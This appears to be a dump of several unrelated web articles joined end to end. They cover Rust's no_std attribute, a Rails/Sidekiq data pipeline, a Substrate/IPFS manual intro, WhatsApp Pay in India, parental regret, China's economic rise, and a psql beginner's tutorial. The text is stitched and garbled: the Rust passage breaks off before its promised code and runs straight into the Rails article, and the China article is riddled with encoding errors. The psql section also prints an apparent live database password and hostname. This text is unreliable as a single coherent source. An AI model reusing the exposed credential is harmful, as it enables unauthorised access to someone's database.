foundation of Rust language. <code>core</code> “isn’t even aware of heap allocation,
nor does it provide concurrency or I/O. These things require platform
integration, and [the <code>core</code>] library is platform-agnostic.”</li>
</ul>
<p>This seemingly innocuous implementation detail turns out to be absolutely
<em>incredible</em> for bare-metal programmers, as it makes it possible to entirely
“opt-out” of all the OS-dependent bits of the standard library. By relying on
the <code>core</code> library directly, it’s possible to write truly portable bare-metal
code free of any and all “hidden” syscalls!</p>
<p>Unlike C, which allows separate item declarations and implementations (e.g:
declaring a method in a <code>.h</code> header file, and implementing it in a <code>.c</code> file),
Rust requires that items are implemented at the same time as they are declared,
making it <em>impossible</em> to get a linker error when writing typical Rust
code.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<p>So, how does a “crate” (Rust lingo for library/binary) opt out of the <code>std</code>
standard library? Why, using the handy-dandy top-level <code>#![no_std]</code> attribute!</p>
<p>As the name implies, the <code>#![no_std]</code> attribute signals to the Rust compiler
that the crate shouldn’t link directly with <code>std</code>, and that it should instead
link with the <code>core</code> library directly.</p>
<p><del><code>#![no_std]</code> is also transitive down the dependency graph, so accidentally
including a dependency that relies on <code>std</code> within a <code>no_std</code> project will be
rejected by the compiler</del><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. This transitive properly makes
it possible to use <code>cargo</code> (Rust’s built-in package manager) to integrate
external dependencies from <code>crate.io</code>, and be confident that if it compiles, it
won’t inadvertently panic at runtime due to a stubbed out “hidden” syscall
dependency. With Rust, using external dependencies with bare-metal code is not
only possible, but thanks to <code>cargo</code>’s best-in-class dependency management
story, it’s incredibly ergonomic as well!</p>
<p>To really show you the power of <code>no_std</code>, lets revisit the <code>greet</code> function from
the last section. Consider the following Rust implementation, which goes out of
it’s way to be as <code>unsafe</code> and un-idiomatic as possible. This could very well be
a “first pass” implementation from a C programmer just getting their feet wet
with Rust:</p>

<p>If you need to bring a lot of data into your app, a data pipeline can help. This article describes how to build a simple data pipeline with Ruby on Rails, Sidekiq, Redis, and Postgres.</p>



<h2>What’s a data pipeline?</h2>



<p>A data pipeline takes information from one place and puts it somewhere else. It likely transforms that data along the way. In enterprise circles, this is called <a href="https://en.wikipedia.org/wiki/Extract,_transform,_load">ETL</a>, or extract-transform-load.</p>



<p>Generally, data pipelines:</p>



<ol><li>Ingest a lot of data at once</li><li>Ingest new or updated data on a schedule</li></ol>



<h2>Splitting data into small jobs</h2>



<p>A reliable pipeline starts big and reduces data into small slices that can be independently processed. Bigger jobs “fan out” into small ones. The smallest jobs, handling one record each, do most of the work.</p>



<p>Breaking work into smaller jobs helps handle failure. If the pipeline ingests 1,000,000 records, chances are that a few of them are invalid. If those invalid records are processing in their own jobs, then then they can fail without impacting other records. </p>



<p><a href="https://www.lobbyfocus.com/">Lobby Focus</a>, a project of mine, ingests <a href="https://www.senate.gov/legislative/Public_Disclosure/database_download.htm">United States lobbying data from the U.S. Senate</a>. There are about 1,000,000 lobbying records from 2010-2020. Processing them all in a single job would be risky, as the entire job would fail if even one record triggered an error. Instead, Lobby Focus breaks down data into small slices and ends up processing each record in its own job. To bring in 1,000,000 lobbying records, it takes 1,001,041 jobs.</p>



<p>Pipelines can handle a ton of jobs with ease. Splitting up work into many small jobs offers advantages:</p>



<ol><li>Most jobs deal with only one record. If a job fails, it’s easy to pin down the problematic record, fix it, and retry it. The rest of the pipeline continues uninterrupted.</li><li>The pipeline can ingest data in parallel, with many small jobs running at once. </li><li>It’s easy to track progress by looking at how many jobs succeeded and how many remain.</li></ol>



<h2>A Ruby on Rails pipeline stack</h2>



<p>This stack, used in the example below, makes for a solid data pipeline:</p>



<ul><li><strong><a href="https://rubyonrails.org/">Ruby on Rails</a></strong> interfaces with all the pieces below and has a strong ecosystem of libraries.</li><li><strong><a href="https://github.com/mperham/sidekiq">Sidekiq</a></strong> manages data pipeline jobs, providing visibility into progress and errors.</li><li><strong><a href="https://redis.io/">Redis</a></strong> backs Sidekiq and stores the job queue.</li><li><strong><a href="https://www.postgresql.org/">Postgres</a></strong> stores intermediate and final data.</li><li><strong><a href="https://aws.amazon.com/s3/">Amazon S3</a></strong> serves as a staging area for source data.</li></ul>



<p>Managed platforms like <a href="http://heroku.com/">Heroku</a> or <a href="https://www.cloud66.com/">Cloud 66</a> are good hosting options for this stack.</p>



<h2>Real-world example: U.S. Senate lobbying data</h2>



<p><a href="https://lobbyfocus.com/">Lobby Focus</a> ingests lobbying data from the U.S. Senate and makes it accessible to users. Here’s a peek into its data pipeline, which breaks data into small jobs and uses the stack above.</p>



<h3>Step 1: Scrape</h3>



<p><strong>1 Sidekiq job</strong> deals with <strong>1,000,000 records</strong></p>



<p><strong>Parameter:</strong> None</p>



<ul><li>Gathers a list of ZIP files from the U.S. Senate, using <a href="https://github.com/jnunemaker/httparty">HTTParty</a> to retrieve the webpage and <a href="https://github.com/sparklemotion/nokogiri">Nokogiri</a> to parse it</li><li>Launches a download job for each ZIP file. To ingest lobbying data from 2010 to 2020, it will launch 40 <strong>download</strong> jobs for 40 ZIP’s.</li></ul>



<h3>Step 2: Download</h3>



<p><strong>40 Sidekiq jobs</strong> deal with <strong>25,000 records</strong> <strong>each</strong></p>



<p><strong>Parameter:</strong> ZIP file URL</p>



<ul><li>Checks the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Last-Modified">last-modified</a> header to see if the current version was already processed. If so, aborts the job.</li><li>Downloads the ZIP and unzips its contents into Amazon S3, using <a href="https://github.com/rubyzip/rubyzip">rubyzip</a> and <a href="https://github.com/aws/aws-sdk-ruby">aws-s3-sdk</a>.</li><li>Launches a <strong>process</strong> job for each XML file in the ZIP. </li></ul>



<h3>Step 3: Process</h3>



<p><strong>1,000 Sidekiq jobs</strong> deal with <strong>1,000 records each</strong></p>



<p><strong>Parameter:</strong> XML file URL (S3)</p>



<ul><li>Parses the XML with <a href="https://nokogiri.org/tutorials/parsing_an_html_xml_document.html">Nokogiri</a></li><li>Adds the content of each record in the XML file to Postgres, as a raw XML string. </li><li>Launches a <strong>load</strong> job for each record in the XML file, passing the Postgres record ID. </li></ul>



<p>Postgres can bear a high volume of record inserts. The pipeline uses it as an intermediate data store. The next job, <strong>load</strong>, receives the Postgres record ID and accesses it to get the XML string. Using Postgres to pass the XML avoids passing giant parameters between jobs. Sidekiq <a href="https://github.com/mperham/sidekiq/wiki/Best-Practices">recommends small job parameters</a> to keep the queue lean and preserve Redis memory.</p>



<h3>Step 4: Load</h3>



<p><strong>1,000,000 Sidekiq jobs</strong> deal with <strong>1 record each</strong></p>



<p><strong>Parameter:</strong> Postgres record ID</p>



<ul><li>Retrieves the XML string from Postgres and parses it with <a href="https://nokogiri.org/tutorials/parsing_an_html_xml_document.html">Nokogiri</a></li><li>Validates data and aborts the job with an error if there is an issue</li><li>Upserts final data record into Postgres</li></ul>



<h2>Staying resilient</h2>



<p>Breaking out data loads into small jobs is key to a resilient pipeline. Here are some more tips:</p>



<h3>Make jobs idempotent</h3>



<p>Any job should be able to run twice without duplicating data. In other words, jobs should be idempotent.</p>



<p>Look for a unique key in the source data and use it to avoid writing duplicate data. </p>



<p>For instance, you can set a Postgres unique index on the key. Then,  use Rails’ <a href="https://blog.bigbinary.com/2019/03/25/rails-6-adds-create_or_find_by.html">create_or_find_by</a> method to create or update a record, depending on whether the key already exists.</p>



<h3>Use constraints to reject invalid data</h3>



<p>Set constraints to stop invalid data from coming in. If a field should always have a value, use a <a href="https://www.postgresql.org/docs/9.4/ddl-constraints.html">Postgres constraint</a> to require that field. Use Ruby’s strict <a href="https://avdi.codes/a-ruby-conversion-idiom/">conversion methods</a> to throw an error and abort a job if you’re expecting one data type (say, an integer like 3) but get another (say, a string like “n/a”).</p>



<p>Data is never perfect. If you catch invalid data errors early, you can adjust your pipeline to handle unexpected values.</p>



<h2>What to read next</h2>



<p>A job management library like Sidekiq is critical to a data pipeline. Read more about <a href="https://github.com/mperham/sidekiq">Sidekiq</a>, the backbone of this example. Its <a href="https://github.com/mperham/sidekiq/wiki/Best-Practices">best practices docs</a> are small and useful. If you’re not using Ruby, find the top job management libraries for your language.</p>



<p>To practice creating a pipeline, find a public dataset that interests you and build a pipeline for it. The United States Government, for instance, lists its open government data on <a href="https://data.gov/">data.gov</a>. Datasets range from <a href="https://data.medicare.gov/data/physician-compare">physician comparison data</a> and a <a href="https://nid.sec.usace.army.mil/ords/f?p=105:19:7020640354040::NO:::">database of every dam in the U.S</a>.</p>



<p>Finally, check out managed solutions like <a href="https://cloud.google.com/dataflow">Google Dataflow</a> for particularly large pipelines.</p>

<blockquote>
<p><strong>Substrate</strong> is a blockchain framework built in Rust, with off-chain worker capabilities.
<br><strong>IPFS</strong> is a distributed file storage network, connecting peers and their content.</p>
</blockquote>
<p>By including <a href="https://github.com/rs-ipfs/rust-ifps">the Rust implementation IPFS</a> in the native
Substrate runtime, and by allowing pass-through wasm calls via Substrate's
<a href="https://www.substrate.io/kb/learn-substrate/off-chain-workers">Off-chain Workers</a>, we enable a powerful and familiar subset of the IPFS APIs, including:</p>
<ul>
<li><code>ipfs add</code> - Write data to IPFS</li>
<li><code>ipfs cat</code> - Read data from IPFS</li>
<li><code>ipfs dht findpeer</code> - Discover peers</li>
<li><code>ipfs dht findprovs</code> - Discover content</li>
<li><code>ipfs swarm connect</code> / <code>disconnect</code> - Swarm with other IPFS peers</li>
<li><code>ipfs pin add</code> / <code>rm</code> - Pin and unpin content</li>
</ul>
<p><code>offchain::ipfs</code> allows you to account for your data transactions and DHT status in the blockchain.
These on-chain insights can serve as a foundation for incentivized data storage and replication.
This means <em>no separate executable</em>: both blockchain and distributed storage are together in one.</p>
<p>The <code>offchain::ipfs</code> Manual is the documentation of our efforts, as well as useful explanations
and code examples to get you started using this technology. Due to <code>offchain::ipfs</code> being a
well-maintained fork of <a href="https://github.com/paritytech/substrate">paritytech/substrate</a>, this manual also stands in as typical
documentation, such as docs.rs and README.md files.</p>

November 16, 2020 | https://restofworld.org/2020/whatsapp-pay-enters-india/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/whatsapp-pay-enters-india/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>A new player has entered the world’s largest untapped mobile money market. Last week, India’s state-backed authority gave WhatsApp the green light to roll out its digital-payments service after almost two years of regulatory delay. The company is now able to offer its service to 20 million new users, about 5% of its more than 400 million users in India.&nbsp;</p>



<p>Facebook CEO Mark Zuckerberg heralded the decision in a video message. “Now you can easily send money to your friends and family through WhatsApp,” <a href="https://www.youtube.com/watch?v=NKF3PKmTIx0">he said</a>. “There is no fee. It’s supported by 140 banks.” All an Indian user needs is a debit card with an authorized bank to set up payments.</p>



<p>WhatsApp Pay is built on India’s state-backed digital-payments system, a 2016 innovation meant to make digital payment as universal as electricity. But the innovation came at the cost of local digital wallets. Today, about 80% of payments on the government-backed interface are made through Google or Walmart. WhatsApp’s entry into India will challenge the dominance of these two giants, but critics argue it all but guarantees that Indian fintechs will be stamped out by foreign players.&nbsp;</p>



<p>Up until 2017, digital wallets reigned supreme in India. The Indian government’s 2016 decision to cancel 86% of cash in circulation drove millions to adopt them, and local fintech companies reaped the benefits: SoftBank- and Alibaba-backed Paytm saw its digital wallets grow from 125 million to more than <a href="https://www.euromoney.com/article/b15ts6qpxvj51d/how-paytm-went-big-on-indian-demonetization">185 million</a> within three months of India’s move to demonetize, and the Sequoia-backed MobiKwik witnessed a <a href="https://qz.com/844564/from-paytm-to-mobikwik-a-7000-increase-and-other-wtf-numbers-thrown-up-by-indias-digital-payment-firms-post-demonetisation/">40% jump</a> in downloads within days. But the euphoria for Indian digital wallets was short-lived.&nbsp;</p>



<p>In 2016, India’s digital-payments authority, NPCI, introduced a new payment system called the Unified Payments Interface (UPI). Unlike Paytm or MobiKwik, UPI apps didn’t require users to create new wallets; consumers and merchants alike could make payments directly from their bank accounts. Although it launched in the same year as the government’s demonetization campaign, UPI wasn’t widely adopted until 2017.</p>



<p>For customers, the new platform was a fast and seamless option; for digital wallets, it made their services obsolete overnight. Legacy banks, long weary of companies like Paytm, quickly bought into UPI. It led to unprecedented digital adoption: There was a <a href="https://razorpay.com/blog/the-era-of-rising-fintech-digital-payments-growth/">300% increase</a> in digital payments in 2019. Wallet transactions, though, <a href="https://razorpay.com/blog/the-upi-wars-whos-the-boss/">declined</a> from 96%&nbsp;of digital transactions in 2016 to a little over 30% in 2018.</p>



<p>“UPI was to payments what electric vehicles were to combustion engines,” said Sharad Sharma, co-founder of iSPIRT, an Indian think tank that promoted the UPI. “People in the old business of digital wallets, with their captive audience, were slower to move,” he said. The challenges for digital-wallet players like Paytm were steep: They had to invest several billion dollars to incentivize adoption, while at the same time jumping through hoops for licenses from regulators. By contrast, UPI apps were lightly regulated and built on top of a preexisting platform. These “wrapper” apps only controlled user information, while money flow was controlled by the banks.</p>



<p>The opportunity UPI presented drew the interest of global giants. In 2017, Google launched Google Pay in India. In 2018, WhatsApp began offering trial versions of WhatsApp Pay to 1 million users, but it quickly ran into a web of controversies stemming from concerns <a href="https://www.medianama.com/2020/06/223-whatsapp-pay-affidavit-good-governance-chambers/">over data privacy</a>.</p>



<p>In the two years WhatsApp Pay languished in regulatory limbo, its competitors covered a lot of ground. Google introduced scratch cards that gamified their transactions on Google Pay, a model that resulted in widespread adoption, though many users engaged in dummy transactions to try their luck at winning coupons. The strategy proved to be lucrative, and ultimately secured Big Tech’s preeminence in India’s digital-payments market. In 2019, Google alone spent more than <a href="https://timesofindia.indiatimes.com/business/india-business/google-pay-spent-rs-1028-crore-for-cashback-in-fy19/articleshow/71803214.cms">$140 million in cash-backs</a> and garnered 67 million customers. Walmart-owned PhonePe, originally an Indian startup, drew users to its platforms with similar gimmicks.</p>

<p>Within three years, multinational tech companies had divided up the UPI market: As of October 2020, PhonePe and Google Pay had 40% and 38% of the market share, respectively. Even Paytm, the old leader in digital wallets, embraced UPI, but its deep-pocketed competitors Google and Walmart continued to spend money on cash-backs to attract more users. Between 2016 and 2018, many local e-wallet companies, including <a href="https://www.economist.com/special-report/2018/05/04/indias-digital-platforms">Trupay</a> shut down, and several others, like Chillr, <a href="https://timesofindia.indiatimes.com/business/india-business/truecaller-acquires-payments-startup-chillr/articleshow/64579911.cms">merged</a> with their competitors. Local media outlets called UPI “<a href="https://www.thehindubusinessline.com/money-and-banking/upi-rise-changes-life-for-fintech-startup-trupay/article9511103.ece">the e-wallet killer</a>.”</p>



<p>Bipin Preet Singh, the co-founder of <a href="https://www.livemint.com/Industry/AkI6PwPp6D3LB3rmbz6hpK/The-coming-UPI-battle-in-mobile-payments.html">MobiKwik, witnessed its value crumble</a> from $327 million to $269 million. “It impacted growth because UPI opened up the market for Google,” Singh said. Despite raising more than a $100 million from marquee investors, MobiKwik was <a href="https://economictimes.indiatimes.com/small-biz/startups/newsbuzz/end-of-the-road-for-mobikwik-the-mobile-wallet-is-walking-a-tightrope/articleshow/64593489.cms">squeezed</a> out and overtaken by UPI players Google and PhonePe. “The open market has disadvantaged us,” said Singh. Even the government’s own UPI app, BHIM, couldn’t compete with the aggressive cash-backs offered by foreign companies.&nbsp;</p>



<p>Nikhil Kumar, the engineer who led the team that built the UPI, said Big Tech’s lead in India’s digital payments comes as a surprise. “We never expected this to be the equation, where it would become a FAANG fight,” he said, using the acronym for Facebook, Amazon, Apple, Netflix, and Google. “We hoped a lot of Indian entrepreneurs would build multiple apps where it would spur a lot of local innovation,” Kumar said.&nbsp;</p>



<p>UPI’s creators had envisioned a future of multiple specialized payments apps: for women-first payments, children-first payments, a hyper-secure variant for the armed forces, etc. “Having hundreds of interoperable apps was the vision,” said Kumar. “But it gradually began to get concentrated.”</p>



<p>“The concentration aspect was never looked into because, at that time, all they wanted was growth,” said Srikanth Lakshmanan, founder of Cashless Consumer, a consumer protection collective for digital payment services. “For NPCI, the overall growth of the platform was important, and for that, Big Tech’s adoption was paramount.”<br></p>



<p>To make matters worse for competing smaller companies, regulators forbade apps from charging for transactions. “There is no revenue model here for smaller companies,” said Anand Lunia, an Indian venture capitalist and outspoken critic of Big Tech’s influence in India. “Google offered cash-backs and discounts to grow users, and the market was cornered by deep-pocketed companies.”&nbsp;</p>



<p>There are hundreds of UPI apps operated by banks and other smaller payment companies, but all of them combined account for only about 20% of the market. Still, Google’s and Walmart’s adoption efforts can’t be undervalued, as even Kumar, the UPI engineer, conceded. “You cannot ignore the fact that it’s actually the adoption of Big Tech and their aggressive promotion that led to this exponential growth of UPI,” he said.&nbsp;</p>



<p>To account for potentially lopsided growth, India’s digital payments regulator has declared that no single player may account for more than 30% of the total volume of transactions beginning in 2023. The cap leaves a lot to be answered. “What would happen if a player hit the 30% quota for the day? Would transactions start failing? How’s the cap beneficial if the user is not served? And why isn’t there concentration risk on the bank side?” asked Lakshmanan of Cashless Consumer.</p>



<p>Google has already expressed its displeasure with the government’s decision to install market caps. “Digital payments in India is still in its infancy,” said Sajith Sivanandan, a Google Pay India executive, in a statement. “This announcement has come as a surprise and has implications for hundreds of millions of users who use UPI for their daily payments and could impact the further adoption of UPI and the end goal of financial inclusion.”</p>



<p>But for local digital wallets looking for a share of the market, the caps are too little, too late. “Let’s be honest: UPI isn’t a small-player game anymore,” said former Paytm executive Deepak Abbot. “No small player can compete. That ship has sailed.”</p>



<p>For Zuckerberg and Facebook, the entry into the market is a big win.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                
<p>Nothing can truly prepare you for <a href="https://fertilityroad.com/are-you-prepared-for-the-path-to-parenthood/">parenthood</a>. You could read every parenting book on the planet and still feel completely overwhelmed the moment you first hold your baby in your arms. In the first few weeks, you barely have time to think, let alone sleep or eat. Once you start to fall into a routine, however, reality sets in. Once you become a parent, there is no going back.</p>



<p>For many, there is no greater joy than bringing life into the world. Some people are born to be parents and they happily change their lives for the good of their children. For others, however, parenthood comes as a surprise or they find the reality is much different than the expectation. Many parents regret having children, and, for some, the feeling is not fleeting.</p>



<p>Whether you’re experiencing parental regret with a newborn baby, a teething toddler, or a moody teenager, your feelings are valid. Here’s what you need to know about parental regret along with some useful tips to help you cope with it.</p>



<p><strong>What is Parental Regret?</strong></p>



<p>Once you have children, your life changes. You no longer have the freedom to make choices solely based on your own needs or preferences. For many people, <a href="https://fertilityroad.com/couple-embark-on-journey-to-become-parents-for-second-time/">becoming a parent</a> is the height of happiness and the key to a fulfilling life. For others, however, welcoming a new life into the world is accompanied by a sense of loss for the life they once or could have lived.</p>



<p>Parenthood can be exhausting. By the time you get the kids through their homework, fed, bathed, and into bed, you’re too tired to even think about everything that needs to be done around the house. You find yourself living in a haze of endless responsibility with little time to yourself. Forget taking an impromptu weekend trip or even going out to dinner without reserving a sitter two weeks ahead.</p>



<p>Many parents gladly give up some of their personal freedoms for a life of responsibility – the experience of parenthood is its own reward. According to<a href="https://news.gallup.com/poll/1588/children-violence.aspx" target="_blank" rel="noopener"> a 2018 Gallup poll</a>, however, 8% of parents in the United States report that they would choose not to have children if they could do their lives over. The reality is that number could be higher if admitting to the challenge and emotional struggle of parenthood weren’t so taboo. Parental regret is very real but many feel like they experience it alone.</p>



<p><strong>Exploring Potential Causes of Parental Regret</strong></p>



<p>The underlying causes of parental regret are different in most cases. Some parents regret the timing, wishing they’d had more opportunity to pursue their education or further their career before having children. For others, regret can be tied to the number of children they’ve had, the partner they’ve had them with, or difficulties with the children themselves such as illness or disability.</p>



<p>We are all shaped by our experiences in life, so take the time to consider all the various factors which may be contributing to your current feelings around being a parent. Here are some to consider:</p>



<ul><li>Your upbringing and relationship with your own parents</li><li>Your past and current mental or physical health</li><li>Your access to emotional support</li><li>Your relationship with your child’s other parent</li><li>Your child’s age, temperament, and behavior</li><li>Your current career and financial situation</li></ul>



<p>The key to coping with parental regret is to acknowledge it rather than denying it and hoping it will resolve on its own. It may help to start a journal where you can keep track of your thoughts and work through your emotions. At the very least, it will be a stepping stone toward having a conversation with your partner or seeking help to learn how to cope.</p>



<p><strong>Tips for Coping with Parental Regret</strong></p>



<p>Regret is a perfectly normal emotion and one we all feel from time to time. You can’t control your feelings, but you can choose how you react to them. Denying your parental regret could make matters worse and may prevent you from experiencing the joy and satisfaction that can come from being a parent. It’s rare that you’ll find a parent that enjoys the job 100% of the time, but you shouldn’t have to live your life wishing you’d made a different decision. The past is behind you, but you have the power to shape your future.</p>



<p>Here are some helpful tips for coping with parental regret:</p>



<p><strong>1. Find a safe space to share</strong>. Regret is a difficult emotion to process, so you may not be ready to share your feelings with someone close to you just yet. Find a safe space to share your feelings anonymously such as an online support group or private Facebook group.</p>



<p><strong>2. Consider virtual therapy</strong>. Talking through your feelings is important but if you’ve experienced disruption to your daily life, you may want to consider treatment. Virtual therapy sessions are affordable and easy to access while<a href="https://www.forhers.com/psychiatry" target="_blank" rel="noopener"> online psychiatry</a> sites can ensure you get the help you need from home.</p>



<p><strong>3. Talk to your partner</strong>. When you’re ready to share, talk to your partner or a trusted family member or friend. It may be a difficult conversation but sharing with someone who cares about you will help you feel less isolated and you’ll be able to start working through your emotions.</p>



<p><strong>4. Give yourself some time</strong>. Being a parent means putting your child’s needs first, often for years at a time. If you have a partner or friends and family you can rely on, accept offers of help and give yourself permission to do something for yourself from time to time. There’s nothing selfish about self-care and you may just find that a little personal time leaves you feeling brighter and more resilient.</p>



<p><strong>5. Reach out to a professional</strong>. If you have thoughts of harming yourself or your baby, reach out to a professional immediately. Use the<a href="https://www.samhsa.gov/find-help/national-helpline" target="_blank" rel="noopener"> Substance Abuse and Mental Health Services</a> (SAMSHA) National Helpline, 1-800-662-HELP (4357), to get help right away.</p>



<p>There is no such thing as a perfect parent. Every parent questions their ability and aptitude from time to time, even if they look to you like Supermom or Superdad. It’s normal to feel stressed, overwhelmed, or even regretful about parenthood from time to time. What’s important is that you receive the help you need to overcome these challenges and to give your child the best life possible.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Political divisions and economic weakness affecting the United States has led to continual dysfunction, putting its status as the worldâ€™s economic leader in doubt, according to a number of experts.</p>

<p>The country, already changed by President Donald Trumpâ€™s isolationist policies, has increasingly been turning inward after a bitter election fight and its struggle to gain control over the COVID-19 pandemic.</p>

<p>Meanwhile, China appears poised to overtake the U.S. as an economic power. Earlier this month, Chinese President Xi Jinping was quoted by state media as saying the countryâ€™s economy could double in size by 2035, implying an annual average growth rate of 4.7 per cent. <a href="https://www.bnnbloomberg.ca/imf-data-shows-virus-will-push-china-gdp-growth-well-beyond-u-s-1.1508650" target="_blank">Bloomberg estimates using International Monetary Fund</a> data show Chinaâ€™s proportion of worldwide growth is on track to be 17 percentage points higher than that of the U.S. by 2025.</p>

<div contenteditable="false" data-video-custom-description="" data-video-custom-title="" id="video-1517657-1605279893198-wrapper">

                    
                    

        

        

        

        <p>Reduced globalization due to an 'insular United States' will weigh on Canada: Gord Nixon </p>
        <p>Gord Nixon, former CEO of Royal Bank of Canada and chair of BCE, joins BNN Bloomberg to discuss why he believes no matter who takes the White House in the 2020 election, protectionism sentiments are likely to prevail from south of the border and weigh on Canada's economy. </p>
            
</div>

<p>â€œThe biggest winner of a bifurcated U.S. has been China,â€� Gord Nixon, former CEO of Royal Bank of Canada and chair of BNN Bloomberg parent company BCE Inc., said in a recent interview. â€œThe dysfunctionality of the U.S. and [its] withdrawal from international organizations has contributed to the rise of China and the reduction of the U.S. position as a global leader.â€�</p>

<p>Nixon said the U.S. will continue to become more insulated and protectionist, a trend started by Trump under his â€œAmerica Firstâ€� trade policies. Trump, who has stoked tensions with China since taking office, started a trade war that for now has resulted in a phase one trade agreement between both countries.</p>

<p>David Rosenberg, chief economist and strategist at Rosenberg Research, said that while the rest of the world battles the resurgence of COVID-19 cases, China in the meantime will maintain its fast growth and strong productivity trends.</p>

<p>â€œThe irony of ironies is that China â€“ the epicenter of the coronavirus â€“ is the only country in the world thatâ€™s going to have positive growth next year and probably accelerate to over eight per cent next year,â€� he told BNN Bloomberg in an interview. â€œWithin the next 10 years, I reckon Chinaâ€™s economy will be bigger than Americaâ€™s. Thatâ€™s going to have all sorts of geopolitical consequences and the question will be, what can be done to curb that ascension? I donâ€™t think it can be reversed.â€�</p>

<div contenteditable="false" data-video-custom-description="" data-video-custom-title="" id="video-1517624-1605279874239-wrapper">

                    
                    

        

        

        

        <p>Investors should concentrate on hard assets going forward rather than financial assets: David Rosenberg </p>
        <p>David Rosenberg, chief economist and strategist at Rosenberg Research, joins BNN Bloomberg to provide his reaction to the U.S. 2020 presidential election outcome. He says that investors are buying back stocks because of less tax risks with Republicans taking the Senate. He also added that Chinese markets are a bonified investment opportunity.  </p>
            
</div>

<p>Margaret McCuaig-Johnston, senior fellow at the University of Alberta's China Institute, said that the fact the U.S. is still reeling from the pandemic could facilitate a shift in global leadership towards China.</p>

<p>â€œIf the U.S. continues on its current trajectory of COVID deaths and the costs to the economy from COVID with major companies failing, I think thatâ€™s very much a possibility,â€� she said in a phone interview.</p>

<p>â€œCertainly China has its act together. Its strategies and plans are extremely comprehensive: Theyâ€™ve got science, technology and innovation plans that are better than what the U.S. has.â€�</p>

<p>McCuaig-Johnston added the more multilateral approach that U.S. president-elect Joe Biden will likely take would help rein in Chinaâ€™s more aggressive foreign policy ambitions and be more effective at addressing human right abuses.</p>

<p>"The U.S. together with other countries is a more effective front than the U.S. running and doing whatever it wants, while other countries try to figure out collectively what they can do,â€� she said.</p>

<p>Former trade advisor to the White House Harry Broadman agrees. He told BNN Bloomberg in an interview that Biden could tap into the fact that other countries such as Canada are having their own problems with China, and create a multilateral front.</p>

<p>â€œThat is [Chinaâ€™s] biggest fear, frankly: that a group of countries gang up on them,â€� Broadman said.</p>

November 16, 2020 | https://tomcam.github.io/postgres/ | <a href="https://web.archive.org/web/*/https://tomcam.github.io/postgres/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      

      

<p>You’ve installed PostgreSQL. Now what? I assume you’ve been given a task that 
uses <code>psql</code> and you want to learn the absolute minimum to
get the job done.</p>

<p>This is both a brief tutorial and a 
quick reference for the absolute least you need to know about <code>psql</code>. 
I assume you’re familiar with the command line and have a rough idea about
what database administration tasks, but aren’t familiar with how to
use <code>psql</code> to do the basics.</p>

<p>View on <a href="https://tomcam.github.io/postgres/">GitHub Pages</a> or directly on <a href="https://github.com/tomcam/postgres/">GitHub</a></p>

<p>The <a href="https://www.postgresql.org/docs/manuals/">PostgreSQL documentation</a> is incredibly 
well written and thorough, but frankly, I didn’t know where to start reading. This
is my answer to that problem.</p>

<p>If you have any complaints or suggestions please let me know by 
sending your feedback to tomcampbell@gmail.com.</p>

<p>It shows how to do the following at the <code>psql</code> prompt:</p>

<ul>
  <li><a href="#opening-a-connection-locally">Start and quit <code>psql</code></a></li>
  <li><a href="#h-help">Get help</a></li>
  <li><a href="#getting-information-about-databases">Get information about databases</a></li>
  <li><a href="#creating-a-database">Create databases</a></li>
  <li><a href="#creating-a-table-create-table">CREATE TABLEs</a></li>
  <li><a href="#adding-a-record-insert-into">INSERT, or add records to a table</a></li>
  <li><a href="#select">SELECT, to do simple queries</a></li>
  <li><a href="#reference">Reference</a> pointing to the official PostgreSQL documentation</li>
</ul>

<p>If you don’t have access to a live PostgreSQL installation at the moment we still have your back.
You can follow through the examples and the output is shown as if you
did type everything out.</p>

<h2 id="the-psql-command-line-utility">The psql command line utility</h2>

<p>Many administrative tasks can or should be done on your local machine, 
even though if database lives on the cloud.
You can do some of them through a visual user interface, but that’s not covered here. 
Knowing how to perform these operations on the command line means you can script them,
and scripting means you can automate tests, check errors, and do data entry on the command line.</p>

<p>This section isn’t a full cheat sheet for <code>psql</code>.
It covers the most common operations and shows them roughly in sequence, 
as you’d use them in a typical work session.</p>

<h2 id="what-you-need-to-know">What you need to know</h2>

<p>Before using this section, you’ll need:</p>

<ul>
  <li>The user name and password for your PostgreSQL database</li>
  <li>The IP address of your remote instance</li>
</ul>

<h3 id="command-line-prompts-on-the-operating-system">Command-line prompts on the operating system</h3>

<p>The <code>$</code> starting a command line in the examples below represents your operating system prompt. 
Prompts are configurable so it may well not look like this. 
On Windows it might look like <code>C:\Program Files\PostgreSQL&gt;</code> but Windows prompts are also configurable.</p>

<div><div><pre><code>$ psql -U sampleuser -h localhost
</code></pre></div></div>

<p>A line starting with <code>#</code> represents a comment. Same for everything to the right of a <code>#</code>. 
If you accidentally type it or copy and paste it in, don’t worry. Nothing will happen.</p>

<div><div><pre><code>This worked to connect to Postgres on DigitalOcean
<span># -U is the username (it will appear in the \l command)</span>
<span># -h is the name of the machine where the server is running.</span>
<span># -p is the port where the database listens to connections. Default is 5432.</span>
<span># -d is the name of the database to connect to. I think DO generated this for me, or maybe PostgreSQL.</span>
<span># Password when asked is csizllepewdypieiib</span>
<span>$ </span>psql <span>-U</span> doadmin <span>-h</span> production-sfo-test1-do-user-4866002-0.db.ondigitalocean.com <span>-p</span> 25060 <span>-d</span> mydb

<span># Open a database in a remote location.</span>
<span>$ </span>psql <span>-U</span> sampleuser <span>-h</span> production-sfo-test1-do-user-4866002-0.db.ondigitalocean.com <span>-p</span> 21334
</code></pre></div></div>
<h2 id="using-psql">Using psql</h2>

<p>You’ll use <code>psql</code> (aka the <a href="https://www.postgresql.org/docs/current/app-psql.html">PostgreSQL interactive terminal</a>) most of all because it’s used to create databases and tables, show information about tables, and even to enter information (records) into the database.</p>

<h3 id="quitting-pqsql">Quitting pqsql</h3>

<p>Before we learn anything else, here’s how to quit <code>psql</code> and return to the operating system prompt.
You type backslash, the letter <code>q</code>, and then you press the Enter or return key.</p>

<div><div><pre><code># Press enter after typing \q
# Remember this is backslash, not forward slash
postgres=# \q
</code></pre></div></div>

<p>This takes you back out to the operating system prompt.</p>

